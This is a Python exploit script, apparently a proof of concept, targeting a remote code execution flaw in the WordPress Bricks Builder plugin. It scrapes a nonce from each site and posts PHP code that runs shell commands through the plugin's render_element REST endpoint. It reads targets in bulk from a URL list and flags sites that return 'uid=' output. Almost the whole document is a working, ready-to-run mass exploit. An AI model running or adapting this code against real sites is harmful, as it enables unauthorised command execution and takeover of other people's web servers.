#!/usr/bin/env python3
# writer: yueji0j1anke
import requests
import re
import colorama

def exploit(url,nonce_value,command):
    url = f'{url}/wp-json/bricks/v1/render_element'
    headers = {
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip",
    }
    data = {
        "postId": "1",
        "nonce": f"{nonce_value}",
        "element": {
            "name": "container",
            "settings": {
                "hasLoop": "true",
                "query": {
                    "useQueryEditor": True,
                    "queryEditor": f"ob_start();echo `{command}`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
                    "objectType": "post"
                }
            }
        }
    }
    response = requests.post(url=url, json=data, headers=headers)
    if response.text.find('uid=') != -1:
        print(colorama.Fore.GREEN + '[info] 发现' + url + '存在漏洞\n')
        print(colorama.Fore.GREEN + '[response] :' + response.text)
    else:
        return False


def find_nonce_value(url):
    try:
        text = requests.get(url=url,verify=False).text
    except Exception as e:
        print(colorama.Fore.RED + '[error] 出现故障：{}'.format(e))
    match  = re.compile(r'"nonce":"(\w+)"').search(text)
    if match:
        return match.group(1)
    else:
        print(colorama.Fore.RED + "[error] 没有发现nonce值")




if __name__ == '__main__':
    for url in open('urls.txt','r').readlines():
        url = url.strip()
        nonce_value = find_nonce_value(url)
        exploit(url,nonce_value,command='id')